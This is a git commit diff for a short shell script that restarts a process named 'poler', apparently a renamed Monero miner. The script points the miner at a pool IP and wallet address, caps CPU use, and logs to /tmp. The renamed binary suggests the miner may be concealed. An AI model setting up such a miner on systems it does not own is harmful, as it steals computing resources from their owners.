0acd87a3e613d6fa1ecaebc3a80308320fb3f671
robbertopp1 <45674442+robbertopp1@users.noreply.github.com>
2019-07-19 17:57:36 -0500

    Update 75.sh

--- 75.sh
+++ 75.sh
@@ -1,3 +1,3 @@
 pkill poler
 sleep 7
-poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 82 --cpu-priority 7 -o 94.103.90.20:5997 -u 42fRBtHhowsGwhe6VdpoUu8ZvLYzaw4ou8AjAaSR6XpkbpUMgjeQXsXKmAjRU7hAXATcMi44pdPANinV7jYNNkRV1n9zJoD --pass=worker1:robbertopp1@gmail.com -k
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 82 --cpu-priority 7 -o 94.103.90.20:5997 -u 42fRBtHhowsGwhe6VdpoUu8ZvLYzaw4ou8AjAaSR6XpkbpUMgjeQXsXKmAjRU7hAXATcMi44pdPANinV7jYNNkRV1n9zJoD --pass=worker3:robbertopp1@gmail.com -k
